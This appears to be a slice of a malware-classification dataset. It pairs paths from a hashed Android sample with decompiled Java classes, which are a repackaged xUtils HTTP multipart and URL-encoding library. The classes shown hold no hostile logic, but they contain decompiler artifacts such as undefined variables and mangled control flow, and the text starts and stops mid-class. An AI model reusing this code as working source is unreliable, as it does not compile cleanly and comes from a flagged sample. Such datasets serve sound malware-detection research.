generateContentType(contentBody);     generateTransferEncoding(contentBody);   }   public void addField(  String str,  String str2){     if (str == null) {       throw new IllegalArgumentException(""Field name may not be null"");     }     this.header.addField(new MinimalField(str,str2));   }   protected void generateContentDisposition(  ContentBody contentBody){     StringBuilder sb=new StringBuilder();     sb.append(""form-data; name=\"""");     sb.append(getName());     sb.append(""\"""");     if (contentBody.getFilename() != null) {       sb.append(""; filename=\"""");       sb.append(contentBody.getFilename());       sb.append(""\"""");     }     addField(""Content-Disposition"",sb.toString());   }   protected void generateContentType(  ContentBody contentBody){     StringBuilder sb=new StringBuilder();     sb.append(contentBody.getMimeType());     if (contentBody.getCharset() != null) {       sb.append(""; charset="");       sb.append(contentBody.getCharset());     }     addField(""Content-Type"",sb.toString());   }   protected void generateTransferEncoding(  ContentBody contentBody){     addField(MIME.CONTENT_TRANSFER_ENC,contentBody.getTransferEncoding());   }   public ContentBody getBody(){     return this.body;   }   public MinimalFieldHeader getHeader(){     return this.header;   }   public String getName(){     return this.name;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client.multipart\HttpMultipart.code","public class HttpMultipart {   private final String boundary;   private final Charset charset;   private final HttpMultipartMode mode;   private final List<FormBodyPart> parts;   private String subType;   private static final ByteArrayBuffer FIELD_SEP=encode(MIME.DEFAULT_CHARSET,"": "");   private static final ByteArrayBuffer CR_LF=encode(MIME.DEFAULT_CHARSET,""\r\n"");   private static final ByteArrayBuffer TWO_DASHES=encode(MIME.DEFAULT_CHARSET,""--"");   public HttpMultipart(  String str,  String str2){     this(str,null,str2);   }   public HttpMultipart(  String str,  Charset charset,  String str2){     this(str,charset,str2,HttpMultipartMode.STRICT);   }   public HttpMultipart(  String str,  Charset charset,  String str2,  HttpMultipartMode httpMultipartMode){     if (str == null) {       throw new IllegalArgumentException(""Multipart subtype may not be null"");     }     if (str2 == null) {       throw new IllegalArgumentException(""Multipart boundary may not be null"");     }     this.subType=str;     this.charset=charset == null ? MIME.DEFAULT_CHARSET : charset;     this.boundary=str2;     this.parts=new ArrayList();     this.mode=httpMultipartMode;   }   private void doWriteTo(  HttpMultipartMode httpMultipartMode,  OutputStream outputStream,  MultipartEntity.CallBackInfo callBackInfo,  boolean z){     callBackInfo.pos=0L;     ByteArrayBuffer encode=encode(this.charset,getBoundary());     for (    FormBodyPart formBodyPart : this.parts) {       if (!callBackInfo.doCallBack(true)) {         throw new InterruptedIOException(""cancel"");       }       writeBytes(TWO_DASHES,outputStream);       callBackInfo.pos+=TWO_DASHES.length();       writeBytes(encode,outputStream);       callBackInfo.pos+=encode.length();       writeBytes(CR_LF,outputStream);       callBackInfo.pos+=CR_LF.length();       MinimalFieldHeader header=formBodyPart.getHeader(); switch (httpMultipartMode) { case STRICT:         Iterator<MinimalField> it=header.iterator();       while (it.hasNext()) {         writeField(it.next(),outputStream);         callBackInfo.pos+=encode(MIME.DEFAULT_CHARSET,r1.getName() + r1.getBody()).length() + FIELD_SEP.length() + CR_LF.length();       }     break; case BROWSER_COMPATIBLE:   writeField(header.getField(""Content-Disposition""),this.charset,outputStream); callBackInfo.pos+=encode(this.charset,r4.getName() + r4.getBody()).length() + FIELD_SEP.length() + CR_LF.length(); if (formBodyPart.getBody().getFilename() != null) { writeField(header.getField(""Content-Type""),this.charset,outputStream); callBackInfo.pos+=encode(this.charset,r1.getName() + r1.getBody()).length() + FIELD_SEP.length() + CR_LF.length(); break; } break; } writeBytes(CR_LF,outputStream); callBackInfo.pos+=CR_LF.length(); if (z) { ContentBody body=formBodyPart.getBody(); body.setCallBackInfo(callBackInfo); body.writeTo(outputStream); } writeBytes(CR_LF,outputStream); callBackInfo.pos+=CR_LF.length(); } writeBytes(TWO_DASHES,outputStream); callBackInfo.pos+=TWO_DASHES.length(); writeBytes(encode,outputStream); callBackInfo.pos+=encode.length(); writeBytes(TWO_DASHES,outputStream); callBackInfo.pos+=TWO_DASHES.length(); writeBytes(CR_LF,outputStream); callBackInfo.pos+=CR_LF.length(); callBackInfo.doCallBack(true); } private void doWriteTo(HttpMultipartMode httpMultipartMode,OutputStream outputStream,boolean z){ doWriteTo(httpMultipartMode,outputStream,MultipartEntity.CallBackInfo.DEFAULT,z); } private static ByteArrayBuffer encode(Charset charset,String str){ ByteBuffer encode=charset.encode(CharBuffer.wrap(str)); ByteArrayBuffer byteArrayBuffer=new ByteArrayBuffer(encode.remaining()); byteArrayBuffer.append(encode.array(),encode.position(),encode.remaining()); return byteArrayBuffer; } private static void writeBytes(String str,OutputStream outputStream){ writeBytes(encode(MIME.DEFAULT_CHARSET,str),outputStream); } private static void writeBytes(String str,Charset charset,OutputStream outputStream){ writeBytes(encode(charset,str),outputStream); } private static void writeBytes(ByteArrayBuffer byteArrayBuffer,OutputStream outputStream){ outputStream.write(byteArrayBuffer.buffer(),0,byteArrayBuffer.length()); outputStream.flush(); } private static void writeField(MinimalField minimalField,OutputStream outputStream){ writeBytes(minimalField.getName(),outputStream); writeBytes(FIELD_SEP,outputStream); writeBytes(minimalField.getBody(),outputStream); writeBytes(CR_LF,outputStream); } private static void writeField(MinimalField minimalField,Charset charset,OutputStream outputStream){ writeBytes(minimalField.getName(),charset,outputStream); writeBytes(FIELD_SEP,outputStream); writeBytes(minimalField.getBody(),charset,outputStream); writeBytes(CR_LF,outputStream); } public void addBodyPart(FormBodyPart formBodyPart){ if (formBodyPart == null) { return; } this.parts.add(formBodyPart); } public List<FormBodyPart> getBodyParts(){ return this.parts; } public String getBoundary(){ return this.boundary; } public Charset getCharset(){ return this.charset; } public HttpMultipartMode getMode(){ return this.mode; } public String getSubType(){ return this.subType; } public long getTotalLength(){ Iterator<FormBodyPart> it=this.parts.iterator(); long j=0; while (it.hasNext()) { long contentLength=it.next().getBody().getContentLength(); if (contentLength < 0) { return -1L; } j+=contentLength; } try { doWriteTo(this.mode,new ByteArrayOutputStream(),false); return j + r0.toByteArray().length; }  catch (Throwable th) { return -1L; } } public void setSubType(String str){ this.subType=str; } public void writeTo(OutputStream outputStream,MultipartEntity.CallBackInfo callBackInfo){ doWriteTo(this.mode,outputStream,callBackInfo,true); } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client.multipart\MIME.code","public class MIME {   public static final String CONTENT_DISPOSITION=""Content-Disposition"";   public static final String CONTENT_TRANSFER_ENC=""Content-Transfer-Encoding"";   public static final String CONTENT_TYPE=""Content-Type"";   public static final Charset DEFAULT_CHARSET=Charset.forName(AsyncHttpResponseHandler.DEFAULT_CHARSET);   public static final String ENC_8BIT=""8bit"";   public static final String ENC_BINARY=""binary""; } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client.multipart\MinimalField.code","class MinimalField {   private final String name;   private final String value;   public MinimalField(  String str,  String str2){     this.name=str;     this.value=str2;   }   public String getBody(){     return this.value;   }   public String getName(){     return this.name;   }   public String toString(){     return this.name + "": "" + this.value;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client.multipart\MinimalFieldHeader.code","class MinimalFieldHeader implements Iterable<MinimalField> {   private final List<MinimalField> fields=new LinkedList();   private final Map<String,List<MinimalField>> fieldMap=new HashMap();   public void addField(  MinimalField minimalField){     if (minimalField == null) {       return;     }     String lowerCase=minimalField.getName().toLowerCase(Locale.US);     List<MinimalField> list=this.fieldMap.get(lowerCase);     if (list == null) {       list=new LinkedList<>();       this.fieldMap.put(lowerCase,list);     }     list.add(minimalField);     this.fields.add(minimalField);   }   public MinimalField getField(  String str){     if (str == null) {       return null;     }     List<MinimalField> list=this.fieldMap.get(str.toLowerCase(Locale.US));     if (list == null || list.isEmpty()) {       return null;     }     return list.get(0);   }   public List<MinimalField> getFields(){     return new ArrayList(this.fields);   }   public List<MinimalField> getFields(  String str){     if (str == null) {       return null;     }     List<MinimalField> list=this.fieldMap.get(str.toLowerCase(Locale.US));     return (list == null || list.isEmpty()) ? Collections.emptyList() : new ArrayList(list);   }   @Override public Iterator<MinimalField> iterator(){     return Collections.unmodifiableList(this.fields).iterator();   }   public int removeFields(  String str){     if (str == null) {       return 0;     }     List<MinimalField> remove=this.fieldMap.remove(str.toLowerCase(Locale.US));     if (remove == null || remove.isEmpty()) {       return 0;     }     this.fields.removeAll(remove);     return remove.size();   }   public void setField(  MinimalField minimalField){     if (minimalField == null) {       return;     }     List<MinimalField> list=this.fieldMap.get(minimalField.getName().toLowerCase(Locale.US));     if (list == null || list.isEmpty()) {       addField(minimalField);       return;     }     list.clear();     list.add(minimalField);     Iterator<MinimalField> it=this.fields.iterator();     int i=0;     int i2=-1;     while (it.hasNext()) {       if (it.next().getName().equalsIgnoreCase(minimalField.getName())) {         it.remove();         if (i2 == -1) {           i2=i;         }       }       i++;     }     this.fields.add(i2,minimalField);   }   public String toString(){     return this.fields.toString();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client.multipart\MultipartEntity.code","public class MultipartEntity implements UploadEntity, HttpEntity {   private static final char[] MULTIPART_CHARS=""-_1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"".toCharArray();   private final String boundary;   private CallBackInfo callBackInfo;   private final Charset charset;   private Header contentType;   private volatile boolean dirty;   private long length;   private final HttpMultipart multipart;   private String multipartSubtype; public class CallBackInfo {     public static final CallBackInfo DEFAULT=new CallBackInfo();     public RequestCallBackHandler callBackHandler=null;     public long totalLength=0;     public long pos=0;     public boolean doCallBack(    boolean z){       if (this.callBackHandler != null) {         return this.callBackHandler.updateProgress(this.totalLength,this.pos,z);       }       return true;     }   }   public MultipartEntity(){     this(HttpMultipartMode.STRICT,null,null);   }   public MultipartEntity(  HttpMultipartMode httpMultipartMode){     this(httpMultipartMode,null,null);   }   public MultipartEntity(  HttpMultipartMode httpMultipartMode,  String str,  Charset charset){     this.callBackInfo=new CallBackInfo();     this.multipartSubtype=""form-data"";     this.boundary=str == null ? generateBoundary() : str;     httpMultipartMode=httpMultipartMode == null ? HttpMultipartMode.STRICT : httpMultipartMode;     this.charset=charset == null ? MIME.DEFAULT_CHARSET : charset;     this.multipart=new HttpMultipart(this.multipartSubtype,this.charset,this.boundary,httpMultipartMode);     this.contentType=new BasicHeader(""Content-Type"",generateContentType(this.boundary,this.charset));     this.dirty=true;   }   public void addPart(  FormBodyPart formBodyPart){     this.multipart.addBodyPart(formBodyPart);     this.dirty=true;   }   public void addPart(  String str,  ContentBody contentBody){     addPart(new FormBodyPart(str,contentBody));   }   public void addPart(  String str,  ContentBody contentBody,  String str2){     addPart(new FormBodyPart(str,contentBody,str2));   }   @Override public void consumeContent(){     if (isStreaming()) {       throw new UnsupportedOperationException(""Streaming entity does not implement #consumeContent()"");     }   }   protected String generateBoundary(){     StringBuilder sb=new StringBuilder();     Random random=new Random();     int nextInt=random.nextInt(11) + 30;     for (int i=0; i < nextInt; i++) {       sb.append(MULTIPART_CHARS[random.nextInt(MULTIPART_CHARS.length)]);     }     return sb.toString();   }   protected String generateContentType(  String str,  Charset charset){     StringBuilder sb=new StringBuilder();     sb.append(""multipart/"" + this.multipartSubtype + ""; boundary="");     sb.append(str);     return sb.toString();   }   @Override public InputStream getContent(){     throw new UnsupportedOperationException(""Multipart form entity does not implement #getContent()"");   }   @Override public Header getContentEncoding(){     return null;   }   @Override public long getContentLength(){     if (this.dirty) {       this.length=this.multipart.getTotalLength();       this.dirty=false;     }     return this.length;   }   @Override public Header getContentType(){     return this.contentType;   }   @Override public boolean isChunked(){     return !isRepeatable();   }   @Override public boolean isRepeatable(){     Iterator<FormBodyPart> it=this.multipart.getBodyParts().iterator();     while (it.hasNext()) {       if (it.next().getBody().getContentLength() < 0) {         return false;       }     }     return true;   }   @Override public boolean isStreaming(){     return !isRepeatable();   }   @Override public void setCallBackHandler(  RequestCallBackHandler requestCallBackHandler){     this.callBackInfo.callBackHandler=requestCallBackHandler;   }   public void setMultipartSubtype(  String str){     this.multipartSubtype=str;     this.multipart.setSubType(str);     this.contentType=new BasicHeader(""Content-Type"",generateContentType(this.boundary,this.charset));   }   @Override public void writeTo(  OutputStream outputStream){     this.callBackInfo.totalLength=getContentLength();     this.multipart.writeTo(outputStream,this.callBackInfo);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client.multipart.content\AbstractContentBody.code","public abstract class AbstractContentBody implements ContentBody {   protected MultipartEntity.CallBackInfo callBackInfo=MultipartEntity.CallBackInfo.DEFAULT;   private final String mediaType;   private final String mimeType;   private final String subType;   public AbstractContentBody(  String str){     if (str == null) {       throw new IllegalArgumentException(""MIME type may not be null"");     }     this.mimeType=str;     int indexOf=str.indexOf(47);     if (indexOf != -1) {       this.mediaType=str.substring(0,indexOf);       this.subType=str.substring(indexOf + 1);     }  else {       this.mediaType=str;       this.subType=null;     }   }   @Override public String getMediaType(){     return this.mediaType;   }   @Override public String getMimeType(){     return this.mimeType;   }   @Override public String getSubType(){     return this.subType;   }   @Override public void setCallBackInfo(  MultipartEntity.CallBackInfo callBackInfo){     this.callBackInfo=callBackInfo;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client.multipart.content\ByteArrayBody.code","public class ByteArrayBody extends AbstractContentBody {   private final byte[] data;   private final String filename;   public ByteArrayBody(  byte[] bArr,  String str){     this(bArr,RequestParams.APPLICATION_OCTET_STREAM,str);   }   public ByteArrayBody(  byte[] bArr,  String str,  String str2){     super(str);     if (bArr == null) {       throw new IllegalArgumentException(""byte[] may not be null"");     }     this.data=bArr;     this.filename=str2;   }   @Override public String getCharset(){     return null;   }   @Override public long getContentLength(){     return this.data.length;   }   @Override public String getFilename(){     return this.filename;   }   @Override public String getTransferEncoding(){     return MIME.ENC_BINARY;   }   @Override public void writeTo(  OutputStream outputStream){     outputStream.write(this.data);     this.callBackInfo.pos+=this.data.length;     this.callBackInfo.doCallBack(false);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client.multipart.content\ContentBody.code","public interface ContentBody extends ContentDescriptor {   String getFilename();   void setCallBackInfo(  MultipartEntity.CallBackInfo callBackInfo);   void writeTo(  OutputStream outputStream); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client.multipart.content\ContentDescriptor.code","public interface ContentDescriptor {   String getCharset();   long getContentLength();   String getMediaType();   String getMimeType();   String getSubType();   String getTransferEncoding(); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client.multipart.content\FileBody.code","public class FileBody extends AbstractContentBody {   private final String charset;   private final File file;   private final String filename;   public FileBody(  File file){     this(file,null,RequestParams.APPLICATION_OCTET_STREAM,null);   }   public FileBody(  File file,  String str){     this(file,null,str,null);   }   public FileBody(  File file,  String str,  String str2){     this(file,null,str,str2);   }   public FileBody(  File file,  String str,  String str2,  String str3){     super(str2);     if (file == null) {       throw new IllegalArgumentException(""File may not be null"");     }     this.file=file;     if (str != null) {       this.filename=str;     }  else {       this.filename=file.getName();     }     this.charset=str3;   }   @Override public String getCharset(){     return this.charset;   }   @Override public long getContentLength(){     return this.file.length();   }   public File getFile(){     return this.file;   }   @Override public String getFilename(){     return this.filename;   }   public InputStream getInputStream(){     return new FileInputStream(this.file);   }   @Override public String getTransferEncoding(){     return MIME.ENC_BINARY;   }   @Override public void writeTo(  OutputStream outputStream){     BufferedInputStream bufferedInputStream;     if (outputStream == null) {       throw new IllegalArgumentException(""Output stream may not be null"");     }     try {       bufferedInputStream=new BufferedInputStream(new FileInputStream(this.file));     }  catch (    Throwable th) {       th=th;       bufferedInputStream=null;     }     try {       byte[] bArr=new byte[4096];       do {         int read=bufferedInputStream.read(bArr);         if (read == -1) {           outputStream.flush();           IOUtils.closeQuietly(bufferedInputStream);           return;         }  else {           outputStream.write(bArr,0,read);           this.callBackInfo.pos+=read;         }       }  while (this.callBackInfo.doCallBack(false));       throw new InterruptedIOException(""cancel"");     }  catch (    Throwable th2) {       th=th2;       IOUtils.closeQuietly(bufferedInputStream);       throw th;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client.multipart.content\InputStreamBody.code","public class InputStreamBody extends AbstractContentBody {   private final String filename;   private final InputStream in;   private long length;   public InputStreamBody(  InputStream inputStream,  long j){     this(inputStream,j,""no_name"",RequestParams.APPLICATION_OCTET_STREAM);   }   public InputStreamBody(  InputStream inputStream,  long j,  String str){     this(inputStream,j,str,RequestParams.APPLICATION_OCTET_STREAM);   }   public InputStreamBody(  InputStream inputStream,  long j,  String str,  String str2){     super(str2);     if (inputStream == null) {       throw new IllegalArgumentException(""Input stream may not be null"");     }     this.in=inputStream;     this.filename=str;     this.length=j;   }   @Override public String getCharset(){     return null;   }   @Override public long getContentLength(){     return this.length;   }   @Override public String getFilename(){     return this.filename;   }   public InputStream getInputStream(){     return this.in;   }   @Override public String getTransferEncoding(){     return MIME.ENC_BINARY;   }   @Override public void writeTo(  OutputStream outputStream){     if (outputStream == null) {       throw new IllegalArgumentException(""Output stream may not be null"");     }     try {       byte[] bArr=new byte[4096];       do {         int read=this.in.read(bArr);         if (read == -1) {           outputStream.flush();           return;         }  else {           outputStream.write(bArr,0,read);           this.callBackInfo.pos+=read;         }       }  while (this.callBackInfo.doCallBack(false));       throw new InterruptedIOException(""cancel"");     }   finally {       IOUtils.closeQuietly(this.in);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client.multipart.content\StringBody.code","public class StringBody extends AbstractContentBody {   private final Charset charset;   private final byte[] content;   public StringBody(  String str){     this(str,""text/plain"",null);   }   public StringBody(  String str,  String str2,  Charset charset){     super(str2);     if (str == null) {       throw new IllegalArgumentException(""Text may not be null"");     }     charset=charset == null ? Charset.forName(AsyncHttpResponseHandler.DEFAULT_CHARSET) : charset;     this.content=str.getBytes(charset.name());     this.charset=charset;   }   public StringBody(  String str,  Charset charset){     this(str,""text/plain"",charset);   }   public static StringBody create(  String str){     return create(str,null,null);   }   public static StringBody create(  String str,  String str2,  Charset charset){     try {       return new StringBody(str,str2,charset);     }  catch (    UnsupportedEncodingException e) {       throw new IllegalArgumentException(""Charset "" + charset + "" is not supported"",e);     }   }   public static StringBody create(  String str,  Charset charset){     return create(str,null,charset);   }   @Override public String getCharset(){     return this.charset.name();   }   @Override public long getContentLength(){     return this.content.length;   }   @Override public String getFilename(){     return null;   }   public Reader getReader(){     return new InputStreamReader(new ByteArrayInputStream(this.content),this.charset);   }   @Override public String getTransferEncoding(){     return MIME.ENC_8BIT;   }   @Override public void writeTo(  OutputStream outputStream){     if (outputStream == null) {       throw new IllegalArgumentException(""Output stream may not be null"");     }     ByteArrayInputStream byteArrayInputStream=new ByteArrayInputStream(this.content);     byte[] bArr=new byte[4096];     do {       int read=byteArrayInputStream.read(bArr);       if (read == -1) {         outputStream.flush();         return;       }  else {         outputStream.write(bArr,0,read);         this.callBackInfo.pos+=read;       }     }  while (this.callBackInfo.doCallBack(false));     throw new InterruptedIOException(""cancel"");   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client.util\URIBuilder.code","public class URIBuilder {   private String encodedAuthority;   private String encodedFragment;   private String encodedPath;   private String encodedQuery;   private String encodedSchemeSpecificPart;   private String encodedUserInfo;   private String fragment;   private String host;   private String path;   private int port;   private List<NameValuePair> queryParams;   private String scheme;   private String userInfo;   public URIBuilder(){     this.port=-1;   }   public URIBuilder(  String str){     try {       digestURI(new URI(str));     }  catch (    URISyntaxException e) {       LogUtils.e(e.getMessage(),e);     }   }   public URIBuilder(  URI uri){     digestURI(uri);   }   private String buildString(  Charset charset){     StringBuilder sb=new StringBuilder();     if (this.scheme != null) {       sb.append(this.scheme).append(':');     }     if (this.encodedSchemeSpecificPart != null) {       sb.append(this.encodedSchemeSpecificPart);     }  else {       if (this.encodedAuthority != null) {         sb.append(""//"").append(this.encodedAuthority);       }  else       if (this.host != null) {         sb.append(""//"");         if (this.encodedUserInfo != null) {           sb.append(this.encodedUserInfo).append(""@"");         }  else         if (this.userInfo != null) {           sb.append(encodeUserInfo(this.userInfo,charset)).append(""@"");         }         if (InetAddressUtils.isIPv6Address(this.host)) {           sb.append(""["").append(this.host).append(""]"");         }  else {           sb.append(this.host);         }         if (this.port >= 0) {           sb.append("":"").append(this.port);         }       }       if (this.encodedPath != null) {         sb.append(normalizePath(this.encodedPath));       }  else       if (this.path != null) {         sb.append(encodePath(normalizePath(this.path),charset));       }       if (this.encodedQuery != null) {         sb.append(""?"").append(this.encodedQuery);       }  else       if (this.queryParams != null) {         sb.append(""?"").append(encodeQuery(this.queryParams,charset));       }     }     if (this.encodedFragment != null) {       sb.append(""#"").append(this.encodedFragment);     }  else     if (this.fragment != null) {       sb.append(""#"").append(encodeFragment(this.fragment,charset));     }     return sb.toString();   }   private void digestURI(  URI uri){     this.scheme=uri.getScheme();     this.encodedSchemeSpecificPart=uri.getRawSchemeSpecificPart();     this.encodedAuthority=uri.getRawAuthority();     this.host=uri.getHost();     this.port=uri.getPort();     this.encodedUserInfo=uri.getRawUserInfo();     this.userInfo=uri.getUserInfo();     this.encodedPath=uri.getRawPath();     this.path=uri.getPath();     this.encodedQuery=uri.getRawQuery();     this.queryParams=parseQuery(uri.getRawQuery());     this.encodedFragment=uri.getRawFragment();     this.fragment=uri.getFragment();   }   private String encodeFragment(  String str,  Charset charset){     return URLEncodedUtils.encFragment(str,charset);   }   private String encodePath(  String str,  Charset charset){     return URLEncodedUtils.encPath(str,charset).replace(""+"",""20%"");   }   private String encodeQuery(  List<NameValuePair> list,  Charset charset){     return URLEncodedUtils.format(list,charset);   }   private String encodeUserInfo(  String str,  Charset charset){     return URLEncodedUtils.encUserInfo(str,charset);   }   private static String normalizePath(  String str){     if (str == null) {       return null;     }     int i=0;     while (i < str.length() && str.charAt(i) == '/') {       i++;     }     return i > 1 ? str.substring(i - 1) : str;   }   private List<NameValuePair> parseQuery(  String str){     if (TextUtils.isEmpty(str)) {       return null;     }     return URLEncodedUtils.parse(str);   }   public URIBuilder addParameter(  String str,  String str2){     if (this.queryParams == null) {       this.queryParams=new ArrayList();     }     this.queryParams.add(new BasicNameValuePair(str,str2));     this.encodedQuery=null;     this.encodedSchemeSpecificPart=null;     return this;   }   public URI build(  Charset charset){     return new URI(buildString(charset));   }   public String getFragment(){     return this.fragment;   }   public String getHost(){     return this.host;   }   public String getPath(){     return this.path;   }   public int getPort(){     return this.port;   }   public List<NameValuePair> getQueryParams(){     return this.queryParams != null ? new ArrayList(this.queryParams) : new ArrayList();   }   public String getScheme(){     return this.scheme;   }   public String getUserInfo(){     return this.userInfo;   }   public URIBuilder setFragment(  String str){     this.fragment=str;     this.encodedFragment=null;     return this;   }   public URIBuilder setHost(  String str){     this.host=str;     this.encodedSchemeSpecificPart=null;     this.encodedAuthority=null;     return this;   }   public URIBuilder setParameter(  String str,  String str2){     if (this.queryParams == null) {       this.queryParams=new ArrayList();     }     if (!this.queryParams.isEmpty()) {       Iterator<NameValuePair> it=this.queryParams.iterator();       while (it.hasNext()) {         if (it.next().getName().equals(str)) {           it.remove();         }       }     }     this.queryParams.add(new BasicNameValuePair(str,str2));     this.encodedQuery=null;     this.encodedSchemeSpecificPart=null;     return this;   }   public URIBuilder setPath(  String str){     this.path=str;     this.encodedSchemeSpecificPart=null;     this.encodedPath=null;     return this;   }   public URIBuilder setPort(  int i){     if (i < 0) {       i=-1;     }     this.port=i;     this.encodedSchemeSpecificPart=null;     this.encodedAuthority=null;     return this;   }   public URIBuilder setQuery(  String str){     this.queryParams=parseQuery(str);     this.encodedQuery=null;     this.encodedSchemeSpecificPart=null;     return this;   }   public URIBuilder setScheme(  String str){     this.scheme=str;     return this;   }   public URIBuilder setUserInfo(  String str){     this.userInfo=str;     this.encodedSchemeSpecificPart=null;     this.encodedAuthority=null;     this.encodedUserInfo=null;     return this;   }   public URIBuilder setUserInfo(  String str,  String str2){     return setUserInfo(str + ':' + str2);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http.client.util\URLEncodedUtils.code","public class URLEncodedUtils {   public static final String CONTENT_TYPE=""application/x-www-form-urlencoded"";   private static final String NAME_VALUE_SEPARATOR=""="";   private static final String PARAMETER_SEPARATOR=""&"";   private static final int RADIX=16;   private static final char[] DELIM={'&'};   private static final BitSet UNRESERVED=new BitSet(256);   private static final BitSet PUNCT=new BitSet(256);   private static final BitSet USERINFO=new BitSet(256);   private static final BitSet PATHSAFE=new BitSet(256);   private static final BitSet FRAGMENT=new BitSet(256);   private static final BitSet RESERVED=new BitSet(256);   private static final BitSet URLENCODER=new BitSet(256); static {     for (int i=97; i <= 122; i++) {       UNRESERVED.set(i);     }     for (int i2=65; i2 <= 90; i2++) {       UNRESERVED.set(i2);     }     for (int i3=48; i3 <= 57; i3++) {       UNRESERVED.set(i3);     }     UNRESERVED.set(95);     UNRESERVED.set(45);     UNRESERVED.set(46);     UNRESERVED.set(42);     URLENCODER.or(UNRESERVED);     UNRESERVED.set(33);     UNRESERVED.set(126);     UNRESERVED.set(39);     UNRESERVED.set(40);     UNRESERVED.set(41);     PUNCT.set(44);     PUNCT.set(59);     PUNCT.set(58);     PUNCT.set(36);     PUNCT.set(38);     PUNCT.set(43);     PUNCT.set(61);     USERINFO.or(UNRESERVED);     USERINFO.or(PUNCT);     PATHSAFE.or(UNRESERVED);     PATHSAFE.set(47);     PATHSAFE.set(59);     PATHSAFE.set(58);     PATHSAFE.set(64);     PATHSAFE.set(38);     PATHSAFE.set(61);     PATHSAFE.set(43);     PATHSAFE.set(36);     PATHSAFE.set(44);     RESERVED.set(59);     RESERVED.set(47);     RESERVED.set(63);     RESERVED.set(58);     RESERVED.set(64);     RESERVED.set(38);     RESERVED.set(61);     RESERVED.set(43);     RESERVED.set(36);     RESERVED.set(44);     RESERVED.set(91);     RESERVED.set(93);     FRAGMENT.or(RESERVED);     FRAGMENT.or(UNRESERVED);   }   private static String decodeFormFields(  String str,  String str2){     if (str == null) {       return null;     }     return urldecode(str,str2 != null ? Charset.forName(str2) : Charset.forName(AsyncHttpResponseHandler.DEFAULT_CHARSET),true);   }   private static String decodeFormFields(  String str,  Charset charset){     if (str == null) {       return null;     }     if (charset == null) {       charset=Charset.forName(AsyncHttpResponseHandler.DEFAULT_CHARSET);     }     return urldecode(str,charset,true);   }   public static String encFragment(  String str,  Charset charset){     return urlencode(str,charset,FRAGMENT,false);   }   public static String encPath(  String str,  Charset charset){     return urlencode(str,charset,PATHSAFE,false);   }   public static String encUserInfo(  String str,  Charset charset){     return urlencode(str,charset,USERINFO,false);   }   private static String encodeFormFields(  String str,  String str2){     if (str == null) {       return null;     }     return urlencode(str,str2 != null ? Charset.forName(str2) : Charset.forName(AsyncHttpResponseHandler.DEFAULT_CHARSET),URLENCODER,true);   }   private static String encodeFormFields(  String str,  Charset charset){     if (str == null) {       return null;     }     if (charset == null) {       charset=Charset.forName(AsyncHttpResponseHandler.DEFAULT_CHARSET);     }     return urlencode(str,charset,URLENCODER,true);   }   public static String format(  Iterable<? extends NameValuePair> iterable,  Charset charset){     StringBuilder sb=new StringBuilder();     for (    NameValuePair nameValuePair : iterable) {       String encodeFormFields=encodeFormFields(nameValuePair.getName(),charset);       String encodeFormFields2=encodeFormFields(nameValuePair.getValue(),charset);       if (sb.length() > 0) {         sb.append(PARAMETER_SEPARATOR);       }       sb.append(encodeFormFields);       if (encodeFormFields2 != null) {         sb.append(NAME_VALUE_SEPARATOR);         sb.append(encodeFormFields2);       }     }     return sb.toString();   }   public static String format(  List<? extends NameValuePair> list,  String str){     StringBuilder sb=new StringBuilder();     for (    NameValuePair nameValuePair : list) {       String encodeFormFields=encodeFormFields(nameValuePair.getName(),str);       String encodeFormFields2=encodeFormFields(nameValuePair.getValue(),str);       if (sb.length() > 0) {         sb.append(PARAMETER_SEPARATOR);       }       sb.append(encodeFormFields);       if (encodeFormFields2 != null) {         sb.append(NAME_VALUE_SEPARATOR);         sb.append(encodeFormFields2);       }     }     return sb.toString();   }   public static boolean isEncoded(  HttpEntity httpEntity){     Header contentType=httpEntity.getContentType();     if (contentType == null) {       return false;     }     HeaderElement[] elements=contentType.getElements();     if (elements.length > 0) {       return elements[0].getName().equalsIgnoreCase(CONTENT_TYPE);     }     return false;   }   public static List<NameValuePair> parse(  String str){     if (str == null) {       return Collections.emptyList();     }     BasicHeaderValueParser basicHeaderValueParser=BasicHeaderValueParser.DEFAULT;     CharArrayBuffer charArrayBuffer=new 